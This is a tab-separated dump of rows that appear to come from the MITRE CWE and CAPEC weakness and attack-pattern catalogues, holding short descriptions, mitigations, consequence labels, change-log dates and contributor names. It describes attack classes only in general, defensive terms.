19667	81	Availability
11107	62	updated Relationships, Taxonomy_Mappings
16274	21	PLOVER
24673	31	1000
20618	97	Manipulating User-Controlled Variables
13629	39	2008-09-08
18970	48	10
21115	44	SOAR Partial
15671	103	Primary
25334	69	Incomplete
6995	66	CRLF Injection
15523	62	updated Relationships
5930	100	The MITRE Corporation
18887	69	Incomplete
8585	56	ChildOf
22286	97	Using Leading 'Ghost' Character Sequences to Bypass Input Filters
8271	70	UI Redressing Attacks on Android Devices
18237	31	1000
24149	35	MITRE
12931	94	In most cases, if cryptanalysis is successful at all, an adversary will not be able to decrypt the entire message, but instead will only be able to deduce some information about the plaintext. However, that may be sufficient for an adversary, depending on the context of the attack.
7587	96	2009-05-08
10190	30	Jonathan Zdziarksi
12586	56	ChildOf
17084	39	2008-07-01
19353	63	Gain Privileges or Assume Identity
14852	31	699
18763	39	2008-08-01
17697	45	Variant
18585	42	Avoid storing passwords in easily accessible locations.
13336	46	A software system should be reluctant to trust variables that have been initialized outside of its trust boundary, especially if they are initialized by users. The variables may have been initialized incorrectly. If an attacker can initialize the variable, then they can influence what the vulnerable system will do.
6351	35	MITRE
7752	96	2008-01-30
9411	81	Confidentiality
20917	72	If the application does not use a secure channel, such as SSL, to exchange sensitive information, it is possible for an attacker with access to the network traffic to sniff packets from the connection and uncover the data. This attack is not technically difficult, but does require physical access to some portion of the network over which the sensitive data travels. This access is usually somewhere near where the user is connected to the network (such as a colleague on the company network) but can be anywhere along the path from the user to the end server.
13271	86	http://msdn.microsoft.com/en-us/magazine/ee335713.aspx
9561	73	Add clauses to the SQL queries such that the query logic does not change.
5846	56	ChildOf
10165	28	CWE Content Team
22588	67	Low
19756	62	updated Applicable_Platforms
21842	26	Architecture and Design
13790	81	Other
21922	74	3
5753	30	Elliotte Rusty Harold
16023	26	Implementation
11114	59	Updated Related_Weaknesses
25070	26	Operation
24070	26	Implementation
21479	39	2013-02-21
22303	86	http://msdn.microsoft.com/en-us/library/89211k9b(VS.80).aspx
25083	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Man-in-the-middle attack tool
8660	39	2014-07-30
14420	62	updated Common_Consequences
12792	39	2015-12-07
25309	23	Data Interchange Protocols are used to transmit structured data between entities. These protocols are often specific to a particular domain (B2B: purchase orders, invoices, transport logistics and waybills, medical records). They are often, but not always, XML-based. Subverting the protocol can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.
24940	90	Language-Independent
19205	80	A variety of password cracking tools and dictionaries are available to launch this type of an attack.
11561	56	ChildOf
20501	26	Architecture and Design
23830	62	updated Demonstrative_Examples, Description, Other_Notes
18339	45	Base
8325	100	The MITRE Corporation
21858	30	Heng Yin
10262	21	PLOVER
9380	62	updated Common_Consequences
9698	35	MITRE
12506	32	National Institute of Standards and Technology (NIST)
12572	28	CWE Content Team
15294	31	1000
13082	51	2014-06-23
14500	28	CWE Content Team
10963	59	Updated Related_Attack_Patterns
12798	28	CWE Content Team
18998	101	CAPEC Content Team
22446	35	MITRE
13166	62	updated Taxonomy_Mappings
21229	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Automated Monitored Execution
22837	35	MITRE
13443	26	Architecture and Design
24487	103	Primary
15709	62	updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings
22595	35	MITRE
5706	102	ChildOf
16851	39	2009-03-10
17343	62	updated Relationships
16317	91	Implementation
20684	62	updated Relationships
15464	39	2017-11-08
7376	101	CAPEC Content Team
24870	57	Primary
22488	35	MITRE
7087	28	CWE Content Team
17708	39	2014-02-18
24449	23	The product uses untrusted input when calculating or using an array index, but the product does not validate or incorrectly validates the index to ensure the index references a valid position within the array.
12936	50	Employ robust authentication processes (e.g., multi-factor authentication).
22644	62	updated References, Relationships
23855	39	2019-06-20
21721	35	MITRE
19480	51	2014-06-23
12427	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
22356	62	updated Description, Name
25320	42	If you only intend to use exported components between related apps under your control, use android:protectionLevel="signature" in the xml manifest to restrict access to applications signed by you.
21187	35	MITRE
21675	35	MITRE
11933	62	updated Potential_Mitigations
17080	63	Gain Privileges or Assume Identity
24680	39	2012-10-30
21224	62	updated References, Relationships
19803	39	2009-07-27
19182	97	Modification of Windows Service Configuration
21078	76	2017-08-04
25288	23	Sending non-cloned mutable data as a return value may result in that data being altered or deleted by the calling function.
14663	28	CWE Content Team
11293	92	Explore
12702	39	2011-09-13
21412	39	2015-12-07
13259	76	2019-09-30
15931	39	2019-01-03
22910	35	MITRE
19989	33	Mateusz "j00ru" Jurczyk
7232	96	2011-03-22
24808	35	MITRE
14055	42	Leverage the HttpOnly flag when setting a sensitive cookie in a response.
25090	23	This weakness occurs when the application transmits or stores authentication credentials and uses an insecure method that is susceptible to unauthorized interception and/or retrieval.
23144	91	Architecture and Design
6212	42	Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.
24916	62	updated Common_Consequences
18730	23	In this attack, some asset (information, functionality, identity, etc.) is protected by a finite secret value. The attacker attempts to gain access to this asset by using trial-and-error to exhaustively explore all the possible secret values in the hope of finding the secret (or a value that is functionally equivalent) that will unlock the asset. Examples of secrets can include, but are not limited to, passwords, encryption keys, database lookup keys, and initial values to one-way functions. The key factor in this attack is the attackers' ability to explore the possible secret space rapidly. This, in turn, is a function of the size of the secret space and the computational power the attacker is able to bring to bear on the problem. If the attacker has modest resources and the secret space is large, the challenge facing the attacker is intractable. While the defender cannot control the resources available to an attacker, they can control the size of the secret space. Creating a large secret space involves selecting one's secret from as large a field of equally likely alternative secrets as possible and ensuring that an attacker is unable to reduce the size of this field using available clues or cryptanalysis. Doing this is more difficult than it sounds since elimination of patterns (which, in turn, would provide an attacker clues that would help them reduce the space of potential secrets) is difficult to do using deterministic machines, such as computers. Assuming a finite secret space, a brute force attack will eventually succeed. The defender must rely on making sure that the time and resources necessary to do so will exceed the value of the information. For example, a secret space that will likely take hundreds of years to explore is likely safe from raw-brute force attacks.
17691	39	2011-09-13
14823	88	Overly Restrictive Account Lockout Mechanism
6226	44	SOAR Partial
12078	35	MITRE
20590	28	CWE Content Team
15859	86	http://software-security.sans.org/blog/2010/03/02/top-25-series-rank-3-classic-buffer-overflow/
13184	53	The MITRE Corporation
24496	28	CWE Content Team
8015	62	updated Applicable_Platforms
9800	26	Implementation
9395	100	The MITRE Corporation
19157	102	ChildOf
20923	86	https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf
17216	35	MITRE
21435	59	Updated References
21800	62	updated Common_Consequences, Demonstrative_Examples
8347	28	Eric Dalci
21631	62	updated Demonstrative_Examples
7224	55	CAPEC Content Team
18865	47	Read Data
18102	28	CWE Content Team
6492	39	2010-04-05
20796	43	Simple
14319	47	Other
18161	62	updated Applicable_Platforms, Demonstrative_Examples, Modes_of_Introduction, Relationships
18199	28	CWE Content Team
21142	51	2014-06-23
15829	62	updated Applicable_Platforms, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Likelihood_of_Exploit, Modes_of_Introduction, Observed_Examples, References, Relationships, White_Box_Definitions
7257	28	CWE Content Team
6737	39	2008-10-14
11305	91	Architecture and Design
7103	42	Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing.
6474	101	CAPEC Content Team
12268	91	Architecture and Design
13076	28	CWE Content Team
14270	88	Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')
12252	94	Attackers can inject false data into data or signaling system data flows of communications and operations, or re-route data flows or signaling data for the purpose of further data intercept and capture.
20154	35	MITRE
12259	54	High
9909	23	The application calls free() on a pointer to memory that was not allocated using associated heap allocation functions such as malloc(), calloc(), or realloc().
18829	62	updated Time_of_Introduction
16758	35	MITRE
6383	28	CWE Content Team
17239	28	CWE Content Team
19577	62	updated References, Relationships, Taxonomy_Mappings
16407	63	DoS: Resource Consumption (Memory)
12174	39	2017-11-08
20159	35	MITRE
25222	104	81
11695	28	Eric Dalci
14040	28	CWE Content Team
22045	62	updated Relationships, Taxonomy_Mappings
19642	28	Eric Dalci
18949	27	The adversary must have the ability to source the file of the incorrect MIME type containing a script.
21155	39	2019-09-19
7999	79	Integrity
9565	91	Architecture and Design
11905	39	2009-12-28
18236	100	The MITRE Corporation
11311	62	updated Common_Consequences, Demonstrative_Examples, Relationships, Taxonomy_Mappings
15208	39	2012-05-11
25177	62	updated Relationships
23590	35	MITRE
9428	28	CWE Content Team
14757	35	MITRE
9786	79	Confidentiality
12100	94	Run Arbitrary Code
16436	39	2010-12-13
18479	66	Automated Source Code Maintainability Measure (ASCMM)
24363	28	CWE Content Team
11647	26	Implementation
10945	81	Integrity
15074	28	CWE Content Team
24574	103	Primary
6081	21	CWE Content Team
5821	74	1
24495	28	CWE Content Team
9830	23	The software uses an unsigned primitive and performs a cast to a signed primitive, which can produce an unexpected value if the value of the unsigned primitive can not be represented using a signed primitive.
16305	23	The software receives data from an upstream component, but only filters a single instance of a special element before sending it to a downstream component.
22167	35	MITRE
21293	39	2011-03-29
13163	62	updated Demonstrative_Examples, References
14304	39	2011-03-29
15729	72	This weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy.
12494	103	Primary
19237	50	Identify programs that may be used to acquire account information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.
14894	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
23781	42	Requirements specification: The choice could be made to use a language that is not susceptible to these issues.
8192	59	Updated Related_Attack_Patterns
19272	28	CWE Content Team
20325	103	Primary
17185	43	Simple
16504	28	CWE Content Team
20723	103	Primary
17723	97	Use of Captured Hashes (Pass The Hash)
14992	31	699
16510	39	2012-05-11
22999	91	Implementation
9682	46	This can cause the software to consume all available file descriptors or handles, which can prevent other processes from performing critical file processing operations.
8076	35	MITRE
24388	35	MITRE
6532	47	Read Data
10829	42	Handle exceptions appropriately in source code. ASP .NET applications should be configured to use custom error pages instead of the framework default page.
23935	56	CanPrecede
10467	56	ChildOf
21216	39	2012-10-30
9785	54	High
12175	23	An attack of this type exploits a buffer overflow vulnerability in the handling of binary resources. Binary resources may include music files like MP3, image files like JPEG files, and any other binary file. These attacks may pass unnoticed to the client machine through normal usage of files, such as a browser loading a seemingly innocent JPEG file. This can allow the attacker access to the execution stack and execute arbitrary code in the target process. This attack pattern is a variant of standard buffer overflow attacks using an unexpected vector (binary files) to wrap its attack and open up a new attack vector. The attacker is required to either directly serve the binary content to the victim, or place it in a locale like a MP3 sharing application, for the victim to download. The attacker then is notified upon the download or otherwise locates the vulnerability opened up by the buffer overflow.
18861	39	2010-04-05
14213	31	1000
18933	35	MITRE
13610	28	CWE Content Team
18988	102	CanPrecede
9117	42	Identify a list of prohibited API functions and prohibit developers from using these functions, providing safer alternatives. In some cases, automatic code analysis tools or the compiler can be instructed to spot use of prohibited functions, such as the "banned.h" include file from Microsoft's SDL. [REF-554] [REF-7]
11363	31	699
24721	21	CWE Content Team
14786	35	Cigital
6013	39	2019-06-20
15919	28	CWE Content Team
21119	88	Integer Overflow to Buffer Overflow
15899	55	CAPEC Content Team
13602	91	Architecture and Design
8445	79	Authorization
17440	85	572
23121	39	2008-07-01
21505	63	Reduce Maintainability
17910	28	Eric Dalci
6627	59	Updated Related_Attack_Patterns
21440	36	http://en.wikipedia.org/wiki/Character_encoding
14341	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Methods_of_Attack, References, Related_Attack_Patterns, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
17896	62	updated Relationships, Taxonomy_Mappings
9619	80	To identify and execute against an over-privileged system interface
24564	35	MITRE
7529	76	2017-05-01
18819	23	The software requires that an actor should only be able to perform an action once, or to have only one unique action, but the software does not enforce or improperly enforces this restriction.
19030	39	2015-12-07
21392	101	CAPEC Content Team
25161	30	David Wheeler
25193	28	CWE Content Team
7563	28	CWE Content Team
8509	28	CWE Content Team
15586	73	Use debugging utility such as File Monitor to monitor the application's filesystem I/O calls
9412	86	http://www.owasp.org/index.php/Web_Application_Firewall
11650	35	MITRE
18486	56	ChildOf
11502	31	1000
15519	73	The attacker tries to explore the security weaknesses by calling malicious signed code from another language allowed by the sandbox.
6446	21	CWE Content Team
14365	38	A large amount of data is passed to the XML parser possibly making it crash or otherwise unavailable to end users.
18495	88	Insecure Automated Optimizations
12538	28	CWE Content Team
22736	47	Bypass Protection Mechanism
15329	62	updated Relationships
15842	51	2014-06-23
14168	53	The MITRE Corporation
15000	62	updated Description
12304	73	Attacker explores potential for submitting files directly to the web server via independently constructed HTTP Requests
14823	69	Incomplete
24212	35	Cigital
21517	88	Incomplete Design Documentation
16377	104	510
8280	103	Primary
23022	35	MITRE
23622	57	Primary
23205	62	updated Potential_Mitigations, Relationships
6845	88	Cleartext Transmission of Sensitive Information
21424	26	Implementation
11405	62	updated Description, References
18928	35	MITRE
6709	76	2015-12-07
10933	100	The MITRE Corporation
20438	62	updated Description, Name
12811	50	Do not trust input data from user. Validate all user input.
13727	39	2008-07-01
14913	31	1000
17869	56	ChildOf
9007	35	Cigital
17604	39	2008-08-15
10011	23	The product uses a cryptographic key or password past its expiration date, which diminishes its safety significantly by increasing the timing window for cracking attacks against that key.
14102	72	The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.
11127	54	Low
6522	62	updated Relationships, Taxonomy_Mappings
22109	62	updated Relationships
13139	35	MITRE
9462	35	MITRE
17597	91	Implementation
20189	45	Variant
15046	39	2019-06-20
16109	35	MITRE
9943	39	2011-03-29
24615	28	CWE Content Team
16668	35	MITRE
9277	62	updated Description, Relationships, Taxonomy_Mappings
19189	62	updated Relationships
9446	35	MITRE
22058	35	MITRE
17752	45	Base
16714	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, Potential_Mitigations, Related_Attack_Patterns, Relationships
22815	28	CWE Content Team
24536	28	CWE Content Team
18374	62	updated Time_of_Introduction
12643	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
17122	28	CWE Content Team
20422	24	MITRE
8773	28	CWE Content Team
22816	63	Gain Privileges or Assume Identity
10004	28	CWE Content Team
19985	53	The MITRE Corporation
5649	62	updated Common_Consequences
17805	28	CWE Content Team
22529	45	Variant
15065	43	Simple
23324	81	Access Control
21301	35	MITRE
23291	35	MITRE
6537	26	Implementation
21354	39	2017-11-08
22023	35	MITRE
19821	42	When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.                   Often, programmers do not protect direct access to files intended only to be included by core programs. These include files may assume that critical variables have already been initialized by the calling program. As a result, the use of register_globals combined with the ability to directly access the include file may allow attackers to conduct file inclusion attacks. This remains an extremely common pattern as of 2009.
18775	35	MITRE
11893	39	2014-06-23
24592	35	MITRE
24586	35	MITRE
18410	76	2018-07-31
6809	54	High
19267	39	2008-07-01
15719	31	1003
12121	100	The MITRE Corporation
5602	31	1000
14581	21	CLASP
15418	62	updated Applicable_Platforms, Relevant_Properties
20624	39	2017-05-03
11876	100	The MITRE Corporation
20019	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
17586	90	Language-Independent
8214	91	Operation
8716	39	2009-05-27
18491	39	2015-12-07
18015	56	ChildOf
7757	62	updated Relationships
23156	55	CAPEC Content Team
14866	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Related_Attack_Patterns, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
6181	31	1000
16697	54	High
15345	62	updated Relationships
13323	89	Detailed
22541	90	Language-Independent
11642	45	Base
14056	40	An On/In Path Device
8904	101	CAPEC Content Team
6341	72	The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.
8198	25	High
20177	61	Draft
8654	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
12574	62	updated Relationships
19370	62	updated Relationships
17180	35	MITRE
7892	62	updated Applicable_Platforms
17304	28	CWE Content Team
11987	43	Simple
17193	42	Generate a new, unique filename for an uploaded file instead of using the user-supplied filename, so that no external input is used at all.[REF-422] [REF-423]
16463	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
22080	28	CWE Content Team
11835	35	MITRE
8160	101	CAPEC Content Team
13537	78	High
6718	35	MITRE
23077	79	Confidentiality
23621	62	updated Demonstrative_Examples
12020	28	CWE Content Team
25301	39	2008-07-01
6213	79	Confidentiality
23491	26	Architecture and Design
18414	63	Modify Memory
6768	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Origin Analysis
23565	62	updated Description, Type
20096	89	Detailed
7353	26	Implementation
9203	46	Many safety features that programmers may take for granted simply do not apply for native code, so you must carefully review all such code for potential problems. The languages used to implement native code may be more susceptible to buffer overflows and other attacks. Native code is unprotected by the security features enforced by the runtime environment, such as strong typing and array bounds checking.
24696	62	updated Name
9847	39	2010-12-13
9505	28	CWE Content Team
17482	33	Riyaz Ahemed Walikar
11714	39	2009-07-27
12983	103	Primary
9905	39	2008-09-08
21887	39	2008-11-24
19422	53	The MITRE Corporation
16103	91	Testing
21039	93	Defense in Depth
20087	39	2011-06-01
6501	39	2010-12-13
20476	73	Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier. Attempt numerous variations based on form, format, syntax & encoding.
10128	51	2014-06-23
20477	50	When possible, use error-correcting (ECC) memory in local devices as non-ECC memory is significantly more vulnerable to faults.
12226	53	The MITRE Corporation
15906	62	updated Relationships, Taxonomy_Mappings
6314	35	MITRE
20975	35	MITRE
15817	39	2008-07-01
24805	21	Evgeny Lebanidze
5621	62	updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities
13293	90	Java
24449	90	Language-Independent
16957	28	CWE Content Team
19632	62	updated Relationships
13456	92	Exploit
21412	62	updated Relationships
24843	39	2010-09-27
14218	39	2019-01-03
23932	62	updated Applicable_Platforms
23637	35	MITRE
21789	28	CWE Content Team
17217	39	2008-11-24
19410	66	California SB-1386
14374	86	http://blogs.sans.org/appsecstreetfighter/2010/03/10/top-25-series-rank-11-hardcoded-credentials/
6471	89	Detailed
15395	56	ChildOf
18230	103	Primary
20511	45	Base
10591	42	Consider refactoring your code to avoid extraction routines altogether.
24373	70	RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax
24449	67	High
23465	90	C#
21551	46	New weaknesses can be exposed because running with extra privileges, such as root or Administrator, can disable the normal security checks being performed by the operating system or surrounding environment. Other pre-existing weaknesses can turn into security vulnerabilities if they occur while operating at raised privileges.             Privilege management functions can behave in some less-than-obvious ways, and they have different quirks on different platforms. These inconsistencies are particularly pronounced if you are transitioning from one non-root user to another. Signal handlers and spawned processes run at the privilege of the owning process, so if a process is running as root when a signal fires or a sub-process is executed, the signal handler or sub-process will operate with root privileges.
11897	97	File Content Injection
20962	28	CWE Content Team
13618	39	2014-02-18
25201	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
7017	69	Draft
6391	83	2007
18985	53	The MITRE Corporation
7846	23	An attacker may intercept and log encrypted transmissions for the purpose of analyzing metadata such as packet timing and sizes. Although the actual data may be encrypted, this metadata may reveal valuable information to an attacker. Note that this attack is applicable to VOIP data as well as application data, especially for interactive apps that require precise timing and low-latency (e.g. thin-clients).
24989	66	Cursor Injection
7379	26	Implementation
7208	102	ChildOf
15157	56	CanPrecede
15726	35	MITRE
13782	42	Do not allow objects to modify private members of a class.
24512	26	Implementation
23187	28	CWE Content Team
24066	43	Simple
8756	28	CWE Content Team
12598	54	Low
10890	28	CWE Content Team
14802	59	Updated Resources_Required
21332	47	Read Data
17105	62	updated Potential_Mitigations
16698	43	Simple
9169	28	CWE Content Team
22730	28	CWE Content Team
7235	39	2009-10-29
21684	76	2018-07-31
21105	35	MITRE
18718	28	CWE Content Team
25369	87	Database Server
16423	63	DoS: Crash, Exit, or Restart
16669	81	Confidentiality
12105	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
20752	44	High
9725	76	2018-07-31
14260	45	Base
5804	56	ChildOf
17475	28	CWE Content Team
21430	35	MITRE
25356	62	updated Relationships
17254	60	22
16352	62	updated Relationships
25013	56	ChildOf
19715	35	MITRE
19089	80	Denial of service
15233	76	2019-09-30
20786	43	Simple
7773	62	updated Demonstrative_Examples, Relationships
13377	35	MITRE
12824	62	updated Common_Consequences
21398	56	ChildOf
12724	76	2017-01-09
11457	28	CWE Content Team
18816	26	Operation
20070	43	Simple
24568	62	updated Potential_Mitigations, Time_of_Introduction
13253	81	Other
9116	88	Struts: Form Bean Does Not Extend Validation Class
6537	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
19213	31	699
11865	55	CAPEC Content Team
12292	35	MITRE
22751	43	Simple
24958	28	CWE Content Team
11808	35	MITRE
9921	35	MITRE
25194	81	Access Control
22514	92	Exploit
11050	62	updated Relationships, Taxonomy_Mappings
11969	62	updated Relationships, Taxonomy_Mappings
18198	63	DoS: Resource Consumption (Other)
10909	28	CWE Content Team
13876	102	ChildOf
8049	39	2017-11-08
19459	28	CWE Content Team
11135	74	4
13552	39	2013-02-21
25389	91	Architecture and Design
20597	39	2014-02-18
25281	28	CWE Content Team
24280	51	2014-06-23
17333	39	2011-06-27
14027	62	updated Relationships, Taxonomy_Mappings
16197	35	MITRE
11198	39	2008-09-08
17570	35	MITRE
15920	96	2018-07-02
24867	44	High
16525	28	CWE Content Team
23778	85	598
18389	35	MITRE
6936	40	The victim is not using a secure channel to communicate with the target system (e.g. SSL, VPN, etc.)
6193	39	2008-09-08
7486	35	MITRE
6167	39	2010-06-21
11066	26	Implementation
13753	39	2008-07-01
5663	81	Other
11984	70	Computer Security: Art and Science
11682	28	CWE Content Team
21569	50	Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.
6858	63	Read Memory
22737	97	Mobile Phishing
22328	27	All that the attacker requires is a means to observe and understand the protocol exchanges in order to reflect the challenges appropriately.
15182	39	2008-10-14
11287	86	http://blog.diniscruz.com/2011/07/two-security-vulnerabilities-in-spring.html
23038	39	2012-05-11
25087	86	http://software-security.sans.org/blog/2010/03/17/top-25-series-rank-16-information-exposure-through-an-error-message
16273	35	MITRE
19990	100	The MITRE Corporation
13111	21	CWE Content Team
19793	35	MITRE
15042	61	Draft
23861	62	updated Relationships
19050	39	2008-07-01
12532	69	Incomplete
9708	35	MITRE
19749	43	Simple
14703	53	The MITRE Corporation
20118	79	Authorization
6018	66	HTTP Communication and Security with Silverlight
6680	35	MITRE
18101	39	2009-03-10
6055	91	Implementation
20279	91	Implementation
10008	28	Sean Eidemiller
14467	43	Simple
14084	62	updated Description
10297	96	2018-07-02
16889	28	CWE Content Team
6636	48	03
23655	89	Detailed
11179	73	DoS through filter failure. The attacker causes the system to crash or stay down because of its failure to filter properly.
13391	39	2012-05-11
15479	39	2014-07-30
10249	47	Read Data
22334	50	Enforce strict schema validation. The schema should enforce a maximum number of array elements. If the number of maximum array elements can't be limited another validation method should be used. One such method could be comparing the declared number of items in the array with the existing number of elements of the array. If these numbers don't match drop the SOAP packet at the web service layer.
5838	69	Draft
15666	56	ChildOf
25436	103	Primary
17474	39	2009-05-27
15755	100	The MITRE Corporation
24897	62	updated Relationships, Taxonomy_Mappings
17132	28	Eric Dalci
13220	85	635
15635	88	Authentication Bypass by Assumed-Immutable Data
12852	39	2012-05-11
21143	35	MITRE
18102	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
19069	62	updated Relationships
6941	79	Access Control
17010	62	updated Taxonomy_Mappings
13290	45	Base
11238	26	Operation
25354	35	MITRE
19328	35	Cigital
20641	55	CAPEC Content Team
14608	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction
17790	90	Language-Independent
15253	62	updated Time_of_Introduction
22664	73	Research popular or high traffic websites which are also homophones.
13504	59	Updated Related_Attack_Patterns
7872	91	Implementation
11547	56	ChildOf
11288	56	ChildOf
9783	79	Integrity
16520	51	2015-11-09
17518	39	2009-03-10
20266	62	updated Applicable_Platforms
22256	85	16
13016	62	updated Description
18696	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
9231	104	166
23062	91	Implementation
18193	91	Architecture and Design
24204	104	477
9645	56	CanPrecede
11897	50	Design: Enforce principle of least privilege
11383	39	2008-07-01
10301	62	updated Time_of_Introduction
25237	62	updated Relationships, Type
14001	62	updated Description, Other_Notes
16223	28	CWE Content Team
20511	46	A duplicate key entry -- if the alist is designed properly -- could be used as a constant time replace function. However, duplicate key entries could be inserted by mistake. Because of this ambiguity, duplicate key entries in an association list are not recommended and should not be allowed.
16510	35	MITRE
20523	104	318
23549	23	Executing commands or loading libraries from an untrusted source or in an untrusted environment can cause an application to execute malicious commands (and payloads) on behalf of an attacker.
7562	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.                   Note that some template mechanisms provide built-in support for the appropriate encoding.
11472	31	1000
22574	62	updated Common_Consequences
12876	76	2017-08-04
15501	88	Incomplete Documentation
16213	28	CWE Content Team
13065	39	2011-03-29
9837	66	Fear the EAR: Discovering and Mitigating Execution After Redirect Vulnerabilities
8406	50	Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.
13320	91	Implementation
16021	40	An application that stores information provided by the user in data storage of some kind.
17922	35	MITRE
11937	101	CAPEC Content Team
9862	95	[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.
13287	91	System Configuration
20560	35	MITRE
16096	74	2
20138	39	2008-09-08
5969	28	CWE Content Team
7373	35	MITRE
24019	62	updated Relationships, Taxonomy_Mappings
5636	79	Integrity
10477	28	CWE Content Team
22733	35	MITRE
10772	39	2012-10-30
6410	35	MITRE
23393	50	Design: Use browser technologies that do not allow client side scripting.
11268	81	Availability
13696	26	Architecture and Design
9197	62	updated Potential_Mitigations
25025	57	Primary
16499	23	The software does not properly "clean up" and remove temporary or supporting resources after they have been used.
6841	28	CWE Content Team
15132	39	2012-05-11
13829	56	ChildOf
8655	23	An exception is thrown from a function, but it is not caught.
16516	35	MITRE
12175	40	Target software contains a buffer overflow vulnerability reachable through input from a user-controllable binary resource file.
13533	47	Resource Consumption
9592	39	2009-01-12
18762	79	Integrity
16689	79	Confidentiality
10026	89	Standard
20965	35	MITRE
21750	28	CWE Content Team
10012	43	Simple
22951	59	Updated @Abstraction, Related_Attack_Patterns
17752	69	Draft
17049	46	Synchronization refers to a variety of behaviors and mechanisms that allow two or more independently-operating processes or threads to ensure that they operate on shared resources in predictable ways that do not interfere with each other.  Some shared resource operations cannot be executed atomically; that is, multiple steps must be guaranteed to execute sequentially, without any interference by other processes.  Synchronization mechanisms vary widely, but they may include locking, mitexes, and semaphores.  When a multi-step operation on a shared resource cannot be guaranteed to execute independent of interference, then the resulting behavior can be unpredictable. Improper synchronization could lead to data or memory corruption, denial of service, etc.
15090	80	Programming attacks.
10223	51	2014-06-23
19616	51	2014-06-23
6952	43	Simple
8328	28	Eric Dalci
23533	62	updated Relationships, Taxonomy_Mappings
17383	85	582
7269	90	C++
6935	62	updated Potential_Mitigations, References, Relationships
21405	35	MITRE
8871	28	CWE Content Team
11859	100	The MITRE Corporation
10173	45	Variant
19109	88	Origin Validation Error
7135	62	updated Relationships
23107	35	MITRE
21724	39	2012-10-30
23436	28	Eric Dalci
18201	39	2008-09-08
14768	28	CWE Content Team
23299	35	MITRE
12348	62	updated Relationships
11113	103	Primary
24830	53	The MITRE Corporation
23354	77	Manual Static Analysis - Source Code
14615	101	CAPEC Content Team
16438	55	CAPEC Content Team
20140	28	CWE Content Team
25160	39	2009-05-27
20393	35	MITRE
